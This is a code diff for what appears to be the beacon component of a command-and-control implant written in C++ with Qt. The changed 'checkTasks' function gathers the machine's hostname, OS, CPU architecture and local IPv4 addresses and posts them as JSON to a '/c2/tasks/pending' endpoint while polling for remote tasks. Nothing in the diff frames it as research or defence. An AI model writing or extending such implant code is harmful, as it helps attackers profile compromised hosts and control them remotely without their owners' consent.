@@ -72,9 +72,30 @@ void Heartbeat::sendHeartbeat() {
 }
 
 void Heartbeat::checkTasks() {
-    // Fetch pending tasks
+    // Send System Info with checkTasks too, to ensure IP is updated if it changes
+    QString hostName = QHostInfo::localHostName();
+    QString osInfo = QSysInfo::prettyProductName() + " (" + QSysInfo::currentCpuArchitecture() + ")";
+    
+    // Collect IP Addresses (Local)
+    QStringList ips;
+    const QList<QHostAddress> addresses = QNetworkInterface::allAddresses();
+    for (const QHostAddress &address : addresses) {
+        if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 && address.protocol() == QAbstractSocket::IPv4Protocol) {
+            ips.append(address.toString());
+        }
+    }
+    QString ipString = ips.join(", ");
+
+    QJsonObject json;
+    json["hostName"] = hostName;
+    json["os"] = osInfo;
+    json["ip"] = ipString;
+
+    // Use POST instead of GET for checkTasks to piggyback system info
     QNetworkRequest request(QUrl(_c2Url + "/c2/tasks/pending"));
-    QNetworkReply* reply = _network.get(request);
+    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+
+    QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
     connect(reply, &QNetworkReply::finished, [this, reply]() {
         if (reply->error() == QNetworkReply::NoError) {
             QByteArray data = reply->readAll();
